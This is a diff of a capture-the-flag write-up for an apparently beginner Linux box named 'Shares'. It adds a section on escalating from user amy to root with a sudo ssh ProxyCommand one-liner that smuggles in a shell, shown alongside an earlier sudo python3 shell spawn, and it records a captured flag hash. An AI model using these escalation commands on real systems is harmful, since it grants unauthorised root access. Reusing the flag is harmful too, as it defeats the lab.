@@ -2,7 +2,7 @@
 tags: [Beginner, Linux]
 title: Shares
 created: '2020-05-25T19:25:40.092Z'
-modified: '2020-05-25T20:16:02.682Z'
+modified: '2020-05-25T20:19:55.414Z'
 ---
 
 # Shares
@@ -94,3 +94,13 @@ But before we move on, let's built some persistence in by uploading our private 
     (amy) NOPASSWD: 
 ```
 - `sudo -u amy /usr/bin/python3 -c 'import os; os.system("/bin/bash")'`
+
+## Enumeration as Amy
+### Writeup
+We run `sudo -l` and see that we can run `ssh` as `root`.
+We can easily get a root shell from the code from [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#sudo)
+
+We can now get `system.txt`: `b910aca7fe5e6fcb5b0d1554f66c1506`
+### Commands
+#### SSH
+- `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
